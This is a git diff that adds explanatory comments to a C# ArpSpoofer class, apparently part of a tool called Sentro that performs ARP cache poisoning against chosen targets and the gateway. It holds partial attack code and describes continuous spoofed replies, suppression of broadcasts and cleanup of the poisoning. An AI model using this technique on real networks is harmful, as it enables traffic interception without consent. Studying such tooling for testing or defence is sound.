@@ -3,7 +3,6 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Net.NetworkInformation;
 using System.Threading.Tasks;
-using PcapDotNet.Base;
 using PcapDotNet.Core;
 using PcapDotNet.Core.Extensions;
 using PcapDotNet.Packets;
@@ -14,13 +13,6 @@ using Sentro.Utilities;
 
 namespace Sentro.ARP
 {
-    /*
-        Responsipility : Perform ARP Cache Poison attack         
-        TODO: what if a machine changed it's ip address with another machine (rare case)
-        TODO: implement a function to find mac address of list of targets at once (performace)
-        TODO: implement exclude to immediate remove from static arp table
-    */
-
     public class ArpSpoofer : IArpSpoofer
     {
         public const string Tag = "ArpSpoofer";
@@ -51,6 +43,12 @@ namespace Sentro.ARP
             return _arpSpoofer ?? (_arpSpoofer = new ArpSpoofer());
         }
 
+        /*
+            to perform arp attack you should change the mac address in the running machine for each target
+            and the router to become 'Static' insted of 'Dynamic' so it doesn't change during the attack
+            
+            - this is important, using dynamic mac address will cause self poison
+        */
         private void InsertAllStaticMacAddresses(NetworkInterface networkInterface)
         {                                
             NetworkUtilites.InsertStaticMac(networkInterface, _gatewayIp, _gatewayMac);
@@ -58,14 +56,21 @@ namespace Sentro.ARP
                 NetworkUtilites.InsertStaticMac(networkInterface, t, KvStore.IpMac[t]);
         }
 
+        /*
+            assure change back static addresses to dynamic so any change in network afterward
+            will take effect on this machine
+        */
         private void DeleteAllStaticMacAddresses(NetworkInterface networkInterface)
         {            
             NetworkUtilites.DeleteStaticMac(networkInterface, _gatewayIp);
             foreach (var t in KvStore.TargetIps)
                 NetworkUtilites.DeleteStaticMac(networkInterface, t);
-
         }
 
+        /*
+            Attack all targets and the router
+            avoid calling 'SpoofFakeAddress' for every single target
+        */
         private void SpoofAllFakeAddresses(NetworkInterface networkInterface, PacketCommunicator communicator)
         {                        
             foreach (string target in KvStore.TargetIps)
@@ -77,6 +82,9 @@ namespace Sentro.ARP
             }
         }
 
+        /*
+            perform arp spoof to a single target
+        */
         private void SpoofFakeAddress(NetworkInterface networkInterface, PacketCommunicator communicator, string target)
         {            
             if (MakeSureTargetIsReadyToBeAttacked(networkInterface, target) == false)
@@ -85,6 +93,10 @@ namespace Sentro.ARP
             SpoofTargetInitialRequest(communicator, target);
         }
 
+       
+        /*
+            this is used insted of 'SpoofRealAddress' to avoid calling a method for each target
+        */
         private void SpoofRealAddresses(PacketCommunicator communicator)
         {            
             foreach (string target in KvStore.TargetIps)
@@ -94,12 +106,19 @@ namespace Sentro.ARP
             }            
         }
 
+        /*
+           reverse arp spoof effect so the internet is never down due to arp attack
+       */
         private void SpoofRealAddress(PacketCommunicator communicator, string target)
         {            
             SpoofGatewayFinalRequest(communicator, target);
             SpoofTargetFinalRequest(communicator, target);
         }
 
+        /*
+            a while loop run in a thread pool to keep sending a spoofed arp replays
+            a wait period is set in settings, decrease wait time if poison effect is lost often
+        */
         private void SpoofContinuousAttack(PacketCommunicator communicator,NetworkInterface networkInterface)
         {
             Task.Run(() =>
@@ -133,6 +152,9 @@ namespace Sentro.ARP
             }).Wait();            
         }
 
+        /*
+            the main method to start the arp attack            
+        */
         public void Spoof(string myIp, HashSet<string> targets)//hashset is used to eliminate duplicate IPs
         {            
 
@@ -171,17 +193,24 @@ namespace Sentro.ARP
                   
             communicator.Dispose();
 
-        }             
+        }
 
+        /*
+            initiate attack by setting static mac addresses and make a starter attack
+        */
         private void BeforeAllAttack(LivePacketDevice livePacketDevice, PacketCommunicator communicator)
         {
             var networkInterface = livePacketDevice.GetNetworkInterface();
             Task.Run(() => FightBackAnnoyingBroadcasts(livePacketDevice));
-
+            
             InsertAllStaticMacAddresses(networkInterface);
             SpoofAllFakeAddresses(networkInterface, communicator);
         }
       
+
+        /*
+            use this method to avoid method calling for each target            
+        */
         private void AfterAttack(NetworkInterface networkInterface, PacketCommunicator communicator)
         {
             SpoofRealAddresses(communicator);
@@ -189,12 +218,21 @@ namespace Sentro.ARP
             _status = Status.Stopped;
         }
 
+        /*
+            clean up after attack by resetting mac addresses to dynamic and make a reverse attack to
+            reconnect targets with the real router
+        */
         private void AfterAttack(NetworkInterface networkInterface, PacketCommunicator communicator,string target)
         {
             SpoofRealAddress(communicator,target);
             NetworkUtilites.DeleteStaticMac(networkInterface,target);            
         }
 
+        /*
+            broadcasts are annoying and let targets find the real router
+            so this will instantly send arp spoofed replay insted of the timed attack
+            and hopefully target is not lost for long time
+        */
         private void FightBackAnnoyingBroadcasts(LivePacketDevice nic)
         {            
             var ether = new EthernetLayer
@@ -233,9 +271,11 @@ namespace Sentro.ARP
             communicator.Dispose();
         }
 
+        /*
+            sends initial arp spoofed packet to the router ( gateway ) 
+        */
         private void SpoofGatewayInitialRequest(PacketCommunicator communicator, string targetIp)
-        {
-            /*put everything in queue and let .Net manage threads*/
+        {            
             Task.Factory.StartNew(() =>
             {
                 var ether = new EthernetLayer
@@ -258,9 +298,11 @@ namespace Sentro.ARP
             });
         }
 
+        /*
+           sends initial arp spoofed packet to the target
+        */
         private void SpoofTargetInitialRequest(PacketCommunicator communicator, string targetIp)
         {
-            /*put everything in queue and let .Net manage threads*/
             Task.Factory.StartNew(() =>
             {
                 var ether = new EthernetLayer
@@ -283,8 +325,11 @@ namespace Sentro.ARP
             });
         }
 
+        /*
+          sends arp spoofed packet to the router ( gateway ) 
+        */
         private void SpoofGateway(PacketCommunicator communicator, string targetIp)
-        { /*put everything in queue and let .Net manage threads*/
+        {
             Task.Factory.StartNew(() =>
             {
                 if (!_gatewayPacketBuilders.ContainsKey(targetIp))
@@ -313,9 +358,11 @@ namespace Sentro.ARP
             });
         }
 
+        /*
+          sends arp spoofed packet to the target
+        */
         private void SpoofTarget(PacketCommunicator communicator, string targetIp)
-        {
-            /*put everything in queue and let .Net manage threads*/
+        {            
             Task.Factory.StartNew(() =>
             {
                 if (!_targetsPacketBuilders.ContainsKey(targetIp))
@@ -344,6 +391,9 @@ namespace Sentro.ARP
             });
         }
 
+        /*
+          sends arp final packet to the router ( gateway ) 
+        */
         private void SpoofGatewayFinalRequest(PacketCommunicator communicator, string targetIp)
         {
             /*put everything in queue and let .Net manage threads*/
@@ -369,6 +419,9 @@ namespace Sentro.ARP
             });
         }
 
+        /*
+          sends arp final spoofed packet to the target
+        */
         private void SpoofTargetFinalRequest(PacketCommunicator communicator, string targetIp)
         {
             /*put everything in queue and let .Net manage threads*/
@@ -394,6 +447,9 @@ namespace Sentro.ARP
             });
         }
 
+        /*
+            find the mac of a given ip and add it to the KvStore and insert the found mac as static
+        */
         private bool MakeSureTargetIsReadyToBeAttacked(NetworkInterface networkInterface, string target)
         {
             if (KvStore.IpMac.ContainsKey(target))
@@ -408,6 +464,9 @@ namespace Sentro.ARP
             return true;
         }
 
+        /*
+            start a new arp spoofing to all machines in the network
+        */
         public void Spoof(string myIp)
         {
             throw new NotImplementedException();
